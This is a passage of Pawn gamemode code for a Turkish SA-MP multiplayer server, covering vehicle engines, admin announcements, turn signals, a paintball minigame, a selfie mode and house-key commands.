			  if (AVehicleData[veh][Fuel] == 0)
			  {
			  SendClientMessage(playerid, COLOR_CYAN,"{FFCC00}» {FFFFFF}The car could not be operated because it is not gasoline!");
			  }else
			    if(health <= 1000 && health > 600)
				{
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{FFCC00}» {FFFFFF}the engine has run - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 1;
			    }
			   if(health < 600 && health > 500)
				{
				    new rand = random(4);
						    if(rand == 3)
						    {
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* the engine has run- %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
							MotorMOD[veh] = 1;
			                }
			                if(rand == 1)
			                {
			  			    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* the engine has run - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
			                }
			    }
			    if(health < 500 && health > 300)
				{
				    new rand = random(2);
						    if(rand == 0)
						    {
						    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, true, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* the engine has run - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 1;
			                }
			                if(rand == 1)
			                {
			  			    GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* the engine has run - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
			                }
			    }
		}else{
		    				GetVehicleParamsEx(veh, engine, lights, alarm, doors, bonnet, boot, objective);
			                SetVehicleParamsEx(veh, false, lights, alarm, doors, bonnet, boot, objective);
			                new Yazi[512], Float:X, Float:Y, Float:Z;
							format(Yazi, 512, "{00FFFF}* engine shut down - %s. (( %s ))", VehNames[ GetVehicleModel( GetPlayerVehicleID(playerid) ) - 400 ], GetName(playerid));

							GetPlayerPos(playerid, X, Y, Z);
							YakinMesaj(Yazi, 15.0, X, Y, Z);
			                MotorMOD[veh] = 0;
		}
 }else{

 SendClientMessage(playerid, COLOR_ORANGE,"{FFCC00}» {FFFFFF}You're not in the driver's seat!");
 }
	return true;
}

// /duyuruekle
CMD:duyuruekle(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 5) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	ShowPlayerDialog(playerid, DialogDuyuruEkle, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Duyuru Ekle", "{F8F8FF}Eklemek istediðiniz duyuru metnini girin:", "Ekle", "Ýptal");
	return 1;
}

// /duyurular
CMD:duyurular(playerid, params[])
{
	if(APlayerData[playerid][PlayerLevel] < 5) return Hata(playerid, "{FFCC00}» {FFFFFF}Bu komutu kullanmak için yetkiniz yok.");
	DuyuruSayfa[playerid] = 0;
	ShowDuyuruMenu(playerid);
	return 1;
}

// ShowDuyuruMenu
ShowDuyuruMenu(playerid)
{
	new Kisalt[50], Count, DiaYazi[2000], DiaBaslik[128];

	foreach(new i : DDs)
	{
		if(i >= 10 * DuyuruSayfa[playerid])
		{
			if(strlen(DinamikDuyuru[i]) > 40)
			{
			    strmid(Kisalt, DinamikDuyuru[i], 0, 40, 40);
			    format(DiaYazi, 2000, "%s%d : \"%s...\"\n", DiaYazi, i, Kisalt);
			}else{
			    format(DiaYazi, 2000, "%s%d : \"%s\"\n", DiaYazi, i, DinamikDuyuru[i]);
			}
			DuyuruList[playerid][Count] = i;
			Count++;
			if(Count == 10) break;
		}
	}

	if(Count == 10)
	{
		format(DiaYazi, 2000, "%sSonraki Sayfa", DiaYazi);
	}

	format(DiaBaslik, 128, "{FFCC00}» {FFFFFF}Duyurular {F8F8FF}(Sayfa %d)", DuyuruSayfa[playerid] + 1);
	ShowPlayerDialog(playerid, DialogDuyuruList, DIALOG_STYLE_LIST, DiaBaslik, DiaYazi, "Düzenle", "Geri");
	return 1;
}


// DuyuruDialogs
DuyuruDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	new DiaYazi[1000];
	switch(dialogid)
	{
	    case DialogDuyuruEkle:
	    {
	        if(response)
	        {
				if(!strlen(inputtext)) return Hata(playerid, "Duyuru metnini girmediniz!"), ShowPlayerDialog(playerid, DialogDuyuruEkle, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Duyuru Ekle", "{F8F8FF}Eklemek istediðiniz duyuru metnini girin:", "Ekle", "Ýptal");
				Duyuru_Yeni(inputtext);
				Bilgi(playerid, "{FFCC00}» {FFFFFF}Duyuru eklediniz. {FFCC00}/duyurular {FFFFFF}listesinden duyurularý düzenleyebilirsiniz.");
	        }
	    }

	    case DialogDuyuruList:
	    {
			if(response)
			{
			    switch(listitem)
			    {
					case 10:
					{
					    DuyuruSayfa[playerid]++;
						ShowDuyuruMenu(playerid);
					}

					default:
					{
					    SecilenDuyuru[playerid] = DuyuruList[playerid][listitem];
						new Kisalt[40];
						strmid(Kisalt, DinamikDuyuru[SecilenDuyuru[playerid]], 0, 40, 40);
					    format(DiaYazi, 1000, "{F8F8FF}Yazý\t{00CED1}%s...\n{FF4040}Þimdi Duyur\n{FF4040}Duyuruyu Sil", Kisalt);
						ShowPlayerDialog(playerid, DialogDuyuruDuzenle, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Duyuru Düzenle", DiaYazi, "Seç", "Geri");
					}
			    }
			}
	    }

	    case DialogDuyuruDuzenle:
	    {
	        if(response)
	        {
				switch(listitem)
				{
				    case 0: // Düzenle
				    {
				        format(DiaYazi, 2000, "{FFCC00}» {FFFFFF}Duyuru Metni:\n{0BEAAE}%s\n\n{F8F8FF}Yeni duyuru metnini giriniz:", DinamikDuyuru[ SecilenDuyuru[playerid] ]);
						ShowPlayerDialog(playerid, DialogDuyuruGuncelle, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Duyuruyu Güncelle", DiaYazi, "Deðiþtir", "Geri");
					}

				    case 1: // Þimdi Duyur
				    {
       					new Yazi[500];
						format(Yazi, 500, "{0BEAAE}Canakkale Meslek %s", DinamikDuyuru[SecilenDuyuru[playerid]]);
						SendClientMessageToAll(-1, Yazi);
				    }

				    case 2: // Sil
				    {
				        Duyuru_Sil(SecilenDuyuru[playerid]);
				        Bilgi(playerid, "{FFCC00}» {FFFFFF}Seçtiðiniz duyuru silindi.");
				    }
				}
	        }else{
	            ShowDuyuruMenu(playerid);
	        }
	    }

	    case DialogDuyuruGuncelle:
	    {
	        if(response)
	        {
				if(!strlen(inputtext))
				{
				    Hata(playerid, "Duyuru metnini girmediniz!");
        			format(DiaYazi, 2000, "{F8F8FF}Duyuru Metni:\n{0BEAAE}%s\n\n{F8F8FF}Yeni duyuru metnini giriniz:", DinamikDuyuru[ SecilenDuyuru[playerid] ]);
					ShowPlayerDialog(playerid, DialogDuyuruGuncelle, DIALOG_STYLE_INPUT, "{FFCC00}» {FFFFFF}Duyuruyu Güncelle", DiaYazi, "Deðiþtir", "Geri");
				    return 1;
				}

				format(DinamikDuyuru[SecilenDuyuru[playerid]], 300, inputtext);
				Bilgi(playerid, "Seçtiðiniz duyuru metni güncellendi.");

				new FileName[35];
				format(FileName, 35, "%s/Duyuru_%d.ini", DUYURU_DIZIN, SecilenDuyuru[playerid]);

				new INI:DDFile = INI_Open(FileName);

				INI_SetTag(DDFile, "dd");

				INI_WriteString(DDFile, "Yazi", DinamikDuyuru[SecilenDuyuru[playerid]]);

				INI_Close(DDFile);

				new Kisalt[40];
				strmid(Kisalt, DinamikDuyuru[SecilenDuyuru[playerid]], 0, 40, 40);
    			format(DiaYazi, 1000, "{F8F8FF}Yazý\t{00CED1}%s...\n{FF4040}Þimdi Duyur\n{FF4040}Duyuruyu Sil", Kisalt);
				ShowPlayerDialog(playerid, DialogDuyuruDuzenle, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Duyuru Düzenle", DiaYazi, "Seç", "Geri");
	        }else{
				new Kisalt[40];
				strmid(Kisalt, DinamikDuyuru[SecilenDuyuru[playerid]], 0, 40, 40);
    			format(DiaYazi, 1000, "{F8F8FF}Yazý\t{00CED1}%s...\n{FF4040}Þimdi Duyur\n{FF4040}Duyuruyu Sil", Kisalt);
				ShowPlayerDialog(playerid, DialogDuyuruDuzenle, DIALOG_STYLE_TABLIST, "{FFCC00}» {FFFFFF}Duyuru Düzenle", DiaYazi, "Seç", "Geri");
	        }
	    }
	}
	return 1;
}

// RandomDuyuru
RandomDuyuru()
{
	if(Iter_Count(DDs) == 0) return 1;
	new DuyuruID = Iter_Random(DDs);
	new Yazi[500];
	format(Yazi, 500, "{0BEAAE}Canakkale Meslek %s", DinamikDuyuru[DuyuruID]);
	SendClientMessageToAll(-1, Yazi);
	return 1;
}

// Duyuru_Yeni
Duyuru_Yeni(Yazi[])
{
	new CreatedID = Iter_Free(DDs);

	Iter_Add(DDs, CreatedID);
	format(DinamikDuyuru[CreatedID], 300, Yazi);

	new FileName[35];
	format(FileName, 35, "%s/Duyuru_%d.ini", DUYURU_DIZIN, CreatedID);

	new INI:DDFile = INI_Open(FileName);

	INI_SetTag(DDFile, "dd");

	INI_WriteString(DDFile, "Yazi", Yazi);

	INI_Close(DDFile);

	return CreatedID;
}

// Duyuru_Sil
Duyuru_Sil(DuyuruID)
{
	if(!Iter_Contains(DDs, DuyuruID)) return 1;
	Iter_Remove(DDs, DuyuruID);

	new FileName[35];
	format(FileName, 35, "%s/Duyuru_%d.ini", DUYURU_DIZIN, DuyuruID);
	if(fexist(FileName)) fremove(FileName);
	return 1;
}

// Duyuru_Yukle
Duyuru_Yukle()
{
	new DDFileName[35];

	for(new i = 0; i < MAX_DUYURU; i++)
	{
		format(DDFileName, 35, "%s/Duyuru_%d.ini", DUYURU_DIZIN, i);

		if(fexist(DDFileName))
		{
		    INI_ParseFile(DDFileName, "LoadDD_%s", .bExtra = true, .extra = i);

			Iter_Add(DDs, i);
		}
	}
	return 1;
}

// LoadDD_dd
forward LoadDD_dd(DuyuruID, name[], value[]);
public LoadDD_dd(DuyuruID, name[], value[])
{
	INI_String("Yazi", DinamikDuyuru[DuyuruID], 300);
	return 1;
}
// Oyuncu3D_Guncelle
Oyuncu3D_Guncelle(playerid)
{
    if(!IsPlayerInAnyVehicle(playerid))
    {
		new Yazi[500];

		if(God[playerid] == 1)
		{
		    format(Yazi, 500, "%s{FFC000}ÖLÜMSÜZLÜK AKTÝF\n", Yazi);
		}


		    switch(APlayerData[playerid][PlayerDjLevel])
		    {
		        case 1: format(Yazi, 500, "%s{FF69B4}« DJ »\n", Yazi);
		        case 2: format(Yazi, 500, "%s{FF69B4}« Yetkili DJ »\n", Yazi);
		    }
		    switch(APlayerData[playerid][PlayerRehberLevel])
		    {
		        case 1: format(Yazi, 500, "%s{FFC000}« 1 Lvl Rehber »\n", Yazi);
		        case 2: format(Yazi, 500, "%s{FFC000}« 2 Lvl Rehber »\n", Yazi);
		        case 3: format(Yazi, 500, "%s{FFC000}« 3 Lvl Rehber »\n", Yazi);
		    }
		    if(APlayerData[playerid][PlayerLevel] != 0)
		    {
		       format(Yazi, 500, "%s{00D0A3}« %s »\n", Yazi, AdminLevelName[APlayerData[playerid][PlayerLevel]]);
		    }
		    if(VIP[playerid] > 0)
		    {
		       format(Yazi, 500, "%s{ADFF2F}« VIP »\n", Yazi);
		    }
		if(Sirket[playerid] != -1)
		{
			if(SirketRutbe[playerid] == 3)
			{
	 			format(Yazi, 500, "%s{FF69B4}[%s]{FFFFFF} %s Patronu\n", Yazi,  Sirketler[Sirket[playerid]][SirketTag], Sirketler[Sirket[playerid]][SirketName]);
			}else{
	 			format(Yazi, 500, "%s{FF69B4}[%s]{FFFFFF} %s  Üyesi.\n", Yazi,  Sirketler[Sirket[playerid]][SirketTag], Sirketler[Sirket[playerid]][SirketName]);
			}
		}

		    format(Yazi, 500, "%s{FFC000}%s\n", Yazi, MeslekIsimCek(playerid));


		format(Yazi, 500, "%s{00CED1}Level %d\n", Yazi, Level[playerid]);

		UpdateDynamic3DTextLabelText(Oyuncu3D[playerid], -1, Yazi);
	}else{
	    UpdateDynamic3DTextLabelText(Oyuncu3D[playerid], -1, " ");
	}
}

// Oyuncu3D_Yukle
Oyuncu3D_Yukle(playerid)
{
	Oyuncu3D[playerid] = CreateDynamic3DTextLabel(" ", -1, 0.0, 0.0, 0.8, 15.0, playerid);
}

// Oyuncu3D_Sil
Oyuncu3D_Sil(playerid)
{
	DestroyDynamic3DTextLabel(Oyuncu3D[playerid]);
}
MeslekIsimCek(playerid)
{
	new MeslekAdi[128];
    switch (APlayerData[playerid][PlayerClass])
			{
				case ClassTruckDriver: {
                format(MeslekAdi, 128, "Týr Þöförü");
				} // Stop any trucker job
 				case ClassBusDriver:{
                format(MeslekAdi, 128, "Otobüs Þöförü");
				} // Stop any trucker job
				case ClassDolmusDriver:{
                format(MeslekAdi, 128, "Dolmuþ Þöförü");
				}
				case ClassPilot: {
                format(MeslekAdi, 128, "Pilot");
				} // Stop any pilot job
				case ClassMafia: {
                format(MeslekAdi, 128, "Mafya");
				} // Stop any mafia job
				case ClassRoadWorker: {
                format(MeslekAdi, 128, "Yol Ýþçisi");
				}
				case ClassCopcu: {
  				format(MeslekAdi, 128, "Çöpçü");
				}
				case ClassKargocu: {
           		format(MeslekAdi, 128, "Kargocu");
				}
				case ClassBanka: {
				format(MeslekAdi, 128, "Bankacý");
				}
				case ClassFire: {
                format(MeslekAdi, 128, "Ýtfaye");
				}
				case ClassPboy: {
                format(MeslekAdi, 128, "Pizzacý");
				}
  				case ClassGemici: {
                format(MeslekAdi, 128, "Gemici");
				}
  				case ClassOduncu: {
                format(MeslekAdi, 128, "Oduncu");
				}
  				case ClassBalikci: {
                format(MeslekAdi, 128, "Balýkçý");
				}
			}
	return MeslekAdi;
}


// Sinyal Sistemi
stock SetCarBlinking(veh, side, bool:skip=false) //0 - left 1 - right 2 - emergy
{
    if(IsCarBlinking(veh) && !skip) return DisableCarBlinking(veh);
    new model=GetVehicleModel(veh),obj[4];
    new id = model-400, trailer;

    if(!skip) BlinkSide[veh] = side;

    GetVehicleZAngle(veh, BlinkR[veh]);

    if(id > -1)
    {
        if(BlinkOffset[id][bX] != 0.0)
        {
            if(side == 0)
            {
                obj[0] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); //blink yellow  front
                Blink[veh][0] = obj[0];
            }
            else
            {
                obj[2] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
                Blink[veh][2] = obj[2];
            }
        }
        if((trailer = GetVehicleTrailer(veh)) != 0)
        {
            if(B_IsTrailer(trailer))
            {
                if(side == 0)
                {
                    obj[1] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); //blink yellow back truck only trailer
                    Blink[veh][1] = obj[1];
                }
                else
                {
                    obj[3] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
                    Blink[veh][3] = obj[3];
                }
            }
        }
        else
        {
            if(BlinkOffset[id][brX] != 0.0)
            {
                if(side == 0)
                {
                    obj[1] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0); //blink yellow back truck only trailer
                    Blink[veh][1] = obj[1];
                }
                else
                {
                    obj[3] = CreateDynamicObject(19294, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
                    Blink[veh][3] = obj[3];
                }
            }
        }

        if(side == 0) //left
        {
            if(obj[0] != 0) AttachDynamicObjectToVehicle(obj[0], veh, BlinkOffset[id][bX],BlinkOffset[id][bY],BlinkOffset[id][bZ], 0.0, 0.0, 0.0);
            if(trailer != 0)
            {
                id = GetVehicleModel(trailer)-400;
                AttachDynamicObjectToVehicle(obj[1], trailer, BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
            else
            {
                if(obj[1] != 0) AttachDynamicObjectToVehicle(obj[1], veh, BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
        }
        else if(side == 1) //right
        {
            if(obj[2] != 0) AttachDynamicObjectToVehicle(obj[2], veh, -BlinkOffset[id][bX],BlinkOffset[id][bY],BlinkOffset[id][bZ], 0.0, 0.0, 0.0);
            if(trailer != 0)
            {
                id = GetVehicleModel(trailer)-400;
                AttachDynamicObjectToVehicle(obj[3], trailer, -BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
            else
            {
                if(obj[3] != 0) AttachDynamicObjectToVehicle(obj[3], veh, -BlinkOffset[id][brX],BlinkOffset[id][brY],BlinkOffset[id][brZ], 0.0, 0.0, 0.0);
            }
        }
        else if(side == 2)  //emergency
        {
            SetCarBlinking(veh, 0, true);
            SetCarBlinking(veh, 1, true);
        }
    }
	return 1;
}
public B_DisableBlinks(vehicleid)
{
    for(new i=0;i<4;i++)
    {
    	if(Blink[vehicleid][i] != -1) DestroyDynamicObject(Blink[vehicleid][i]);
    	Blink[vehicleid][i] = -1;
    }
    return 1;
}

stock DisableCarBlinking(veh)
{
	if(!IsCarBlinking(veh)) return 1;
    B_DisableBlinks(veh);
	return 1;
}

stock IsCarBlinking(vehicleid)
{
    if((BlinkSide[vehicleid] == 0 && Blink[vehicleid][0] == -1 && Blink[vehicleid][1] == -1) || (BlinkSide[vehicleid] == 1 && Blink[vehicleid][2] == -1 && Blink[vehicleid][3] == -1)) return 0;
    else if(Blink[vehicleid][0] == -1 && Blink[vehicleid][1] == -1 && Blink[vehicleid][2] == -1 && Blink[vehicleid][3] == -1) return 0;
    return 1;
}

stock B_IsTrailer(vehicleid)
{
    switch(GetVehicleModel(vehicleid))
    {
        case 435, 450, 584, 591, 606: return 1;
    }
    return 0;
}

public B_OnTrailerDetached(trailerid, fromvehicleid)
{
    if(IsCarBlinking(fromvehicleid))
    {
        DisableCarBlinking(fromvehicleid);
        SetCarBlinking(fromvehicleid, BlinkSide[fromvehicleid]);
    }
    TrailerVehicle[trailerid] = 0;
}

public B_OnTrailerAttached(trailerid, tovehicleid)
{
    if(IsCarBlinking(tovehicleid))
    {
        DisableCarBlinking(tovehicleid);
        SetCarBlinking(tovehicleid, BlinkSide[tovehicleid]);
    }
    TrailerVehicle[trailerid] = tovehicleid;
}

public B_TrailerCheck()
{
    new trailer;
    for(new i=0;i<MAX_VEHICLES;i++)
    {
        if((trailer = GetVehicleTrailer(i)) != 0)
        {
            if(BlinkTrailer[i] == 0)
            {
                BlinkTrailer[i]=trailer;
                B_OnTrailerAttached(trailer, i);
            }
        }
        else if(BlinkTrailer[i] != 0)
        {
            B_OnTrailerDetached(BlinkTrailer[i], i);
            BlinkTrailer[i] = 0;
        }
    }
}
new PBStartTime;
// PaintBall
public PaintBallStarting(playerid)
{
		new string[128];
		if(PBPlayers == 1)
		{
	   		format(string,sizeof(string),"PaintBall Maçý katýlýmlarý baþladý en az 2 kiþi olduðunda baþlayacaktýr ! (Katýlan oyuncu sayýsý : %d)",PBPlayers);
	    }
		if(PBPlayers == 2)
		{
		    PBStartTime = 30;
	    	SetTimer("PaintBallStartTime",1000,true);
	    	format(string,sizeof(string),"%d Saniye sonra PaintBall maçý baþlayacaktýr katýlmak için acele et ! (Katýlan oyuncu sayýsý : %d)",PBStartTime, PBPlayers);
        }else if(PBPlayers > 2){
        	format(string,sizeof(string),"%d Saniye içsonra PaintBall maçý baþlayacaktýr katýlmak için acele et ! (Katýlan oyuncu sayýsý : %d)",PBStartTime, PBPlayers);
        }
        SendClientMessageToAll(COLOR_LIGHTBLUE,string);
}
forward PaintBallStartTime();
public PaintBallStartTime()
{
	if(PBStartTime != 0)
	{
	    new string[128];
    	PBStartTime--;
	  	if(PBStartTime <= 5 && PBStartTime > 0)
	  	{
        	format(string,sizeof(string),"%d Saniye sonra PaintBall maçý baþlayacaktýr katýlmak için acele et ! (Katýlan oyuncu sayýsý : %d)",PBStartTime, PBPlayers);
	  	}
	  	SendClientMessageToAll(COLOR_LIGHTBLUE,string);
    }else{
        PaintBallStart();
        PBStartTime = -1;
    }
}
public PaintBallStart()
{
	PBStarted = true;
    SendClientMessageToAll(COLOR_LIGHTBLUE,"Paintball maçý baþladý !");
    for(new i = 0;i < MAX_PLAYERS; i++)
	{
	    if(PlayerPBing[i] == true)
		{
			    ResetPlayerWeapons(i);
			    SilahIzni[i] = 1;
			    GivePlayerWeapon(i,24,99999);
			    GivePlayerWeapon(i,25,99999);
			    GivePlayerWeapon(i,31,99999);
			    GivePlayerWeapon(i,29,99999);
			    GivePlayerWeapon(i,34,99999);
			    SendClientMessage(i,COLOR_LIGHTRED,"PaintBall maçý 3 dakika sonra sona erecektir !");
			    TogglePlayerControllable(i,1);
			    SetTimer("PaintBallEnd",180000,false);
		}
    }
    return 1;
}
public PaintBallEnd()
{
	new string[128],string2[128],pName[MAX_PLAYER_NAME];

	GetPlayerName(PBLeaderid,pName,MAX_PLAYER_NAME);

	PBStarted = false;

	format(string,sizeof(string),""COL_WHITE"PaintBall maçý sona erdi, Kazanan: "COL_RED"%s(%d) "COL_WHITE"Öldürdüðü kiþi sayýsý: "COL_RED"%d ",pName,PBLeaderid,PBLeaderKills);
	format(string2,sizeof(string2),"Maçta toplam %d kiþi vardý.",PBPlayers);
	SendClientMessageToAll(COLOR_WHITE,string);
	
			
	for(new i = 0;i < MAX_PLAYERS; i++)
	{
		if(PlayerPBing[i] == true)
		{
		    SendClientMessage(i,COLOR_LIGHTBLUE,string2);
			SetPlayerPos(i,1310.1099,-1367.9067,13.5421);
			ResetPlayerWeapons(i);
			SilahIzni[i] = 0;
			PlayerPBKills[i] = 0;
			PlayerPBing[i] = false;
			PaintTEXT[i] = 0;
			PBPlayers = 0;
			PBLeaderid = 999;
			PBLeaderKills = 0;
			SetPlayerArmour(i,0.0);
			SetPlayerHealth(i,painthealth[i]);
			SetPlayerSkin(i,PaintSkin[i]);
			SetPlayerTeam(i, PBteam[i]);
		}
	}
	return 1;
}
CMD:paintball(playerid, params[])
{
		SendAdminText(playerid, "/paintball", params);
		if(!IsPlayerInRangeOfPoint(playerid,3.0,1310.1099,-1367.9067,13.5421))return SendClientMessage(playerid,-1,"PaintBall mekanýna yakýn deðilsin.");
	    if(APlayerData[playerid][JobStarted] == true) return SendClientMessage(playerid, -1, "{FF0000}Görevdeyken bu komutu kullanamazsiniz!");
	    if(PBStarted == false)
	    {
    		GetPlayerHealth(playerid,painthealth[playerid]);
		    new RandomSpawn = random(sizeof(PBSpawns));
		    new RandomSkin = random(sizeof(PBSkins));
		    SetPlayerSkin(playerid,PBSkins[RandomSkin]);
			SetPlayerPos(playerid,PBSpawns[RandomSpawn][0],PBSpawns[RandomSpawn][1],PBSpawns[RandomSpawn][2]);
			SetPlayerFacingAngle(playerid,PBSpawns[RandomSpawn][3]);
			SetPlayerArmour(playerid,50.0);
			SetPlayerHealth(playerid,100.0);
			TogglePlayerControllable(playerid,0);
			PlayerPBing[playerid] = true;
			PBLeaderid = playerid;
			PBLeaderKills = 0;
			PBPlayers++;
			PBteam[playerid] = GetPlayerTeam(playerid);
			SetPlayerTeam(playerid, playerid+1000);
   			PaintBallStarting(playerid);
		}
		else
		{
			SendClientMessage(playerid,COLOR_LIGHTRED,"PaintBall maçý baþlamýþ ! 3 Dakika içinde tekrar baþlayacaktýr.");
		}
	return true;
}
// < Selfie Sistemi > ==========================================================
CMD:selfie(playerid,params[])
{
		SendAdminText(playerid, "/selfie", params);
        if(takingselfie[playerid] == 0)
        {
            	TogglePlayerControllable(playerid,0);
                GetPlayerPos(playerid, xxx[playerid], yyy[playerid], zzz[playerid]);
                SetPlayerFacingAngle(playerid,269.9766);
                GetPlayerFacingAngle(playerid, aaa[playerid]);
                nyyy[playerid] = yyy[playerid];
                nzzz[playerid] = zzz[playerid]+1;
                SetPlayerCameraPos(playerid,xxx[playerid]+1.4,nyyy[playerid],nzzz[playerid]);
                SetPlayerCameraLookAt(playerid,xxx[playerid],yyy[playerid],zzz[playerid]+1);
                SendClientMessage(playerid, COLOR_RED,"Selfie moduna geçtiniz çýkmak için tekrardadn '/selfie' yazýnýz");
            	ApplyAnimation(playerid, "PED", "gang_gunstand", 4.1, 1, 1, 1, 1, 1, 1);
                takingselfie[playerid] = 1;
                righttt[playerid] = 0;
                lefttt[playerid] = 0;
                return 1;
        }
    	if(takingselfie[playerid] == 1)
        {
            TogglePlayerControllable(playerid,1);
            SetCameraBehindPlayer(playerid);
            takingselfie[playerid] = 0;
            ClearAnimations(playerid);
            return 1;
        }
    return 1;
}
/* ============ Ev Sistemi Oyuncu Komutlarý ============ */
CMD:ev(playerid, params[])
{
	if(InHouse[playerid] == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
	ShowHouseMenu(playerid);
	return 1;
}

CMD:anahtarlarim(playerid, params[])
{
    new query[200], Cache: mykeys;
    mysql_format(Connection, query, sizeof(query), "SELECT HouseID, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as KeyDate FROM housekeys WHERE Player='%e' ORDER BY Date DESC LIMIT 0, 15", GetName(playerid));
	mykeys = mysql_query(Connection, query);
	ListPage[playerid] = 0;

	new rows = cache_num_rows();
	if(rows) {
 		new list[1024], id, key_date[20];
   		format(list, sizeof(list), "Ev ID\tAldýðýn tarih\n");
	    for(new i; i < rows; ++i)
	    {
	        cache_get_value_name_int(i, "HouseID", id);
       		cache_get_value_name(i, "KeyDate", key_date);
	        format(list, sizeof(list), "%s%s's %s\t%s\n", list, HouseData[id][Owner], HouseData[id][HOName], key_date);
	    }

		ShowPlayerDialog(playerid, DIALOG_MY_KEYS, DIALOG_STYLE_TABLIST_HEADERS, "Anahtarlarýn (Page 1)", list, "Ýleri", "Kapat");
	}else{
		SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir anahtara sahip deðilsin.");
	}

	cache_delete(mykeys);
	return 1;
}

CMD:evanahtarver(playerid, params[])
{
    if(InHouse[playerid] == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
    new id, houseid = InHouse[playerid];
	if(strcmp(HouseData[houseid][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	if(sscanf(params, "u", id)) return SendSyntaxMessage(playerid, "/evanahtarver [player id]");
	if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Hatalý oyuncu ID.");
	if(id == playerid) return SendClientMessage(playerid, 0xE74C3CFF, "Kendine anahtar veremezsin.");
	if(Iter_Contains(HouseKeys[id], houseid)) return SendClientMessage(playerid, 0xE74C3CFF, "Girdiðiniz oyuncuda zaten bu anahtar mevcut");
	Iter_Add(HouseKeys[id], houseid);

	new query[128];
	mysql_format(Connection, query, sizeof(query), "INSERT INTO housekeys SET HouseID=%d, Player='%e', Date=UNIX_TIMESTAMP()", houseid, GetName(id));
	mysql_tquery(Connection, query, "", "");

	format(query, sizeof(query), "%s Ýsimli kiþiye anahtar verdin.", GetName(id));
	SendClientMessage(playerid, -1, query);
	format(query, sizeof(query), "%s Ýsimli kiþi sana, %s isimli evinin anahtarýný verdi.", HouseData[houseid][Owner], HouseData[houseid][HOName]);
	SendClientMessage(id, -1, query);
	return 1;
}

CMD:evanahtargerial(playerid, params[])
{
    if(InHouse[playerid] == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
    new id, houseid = InHouse[playerid];
	if(strcmp(HouseData[houseid][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	if(sscanf(params, "u", id)) return SendSyntaxMessage(playerid, "/evanahtargerial <ID>");
	if(id == INVALID_PLAYER_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Hatalý oyuncu ID.");
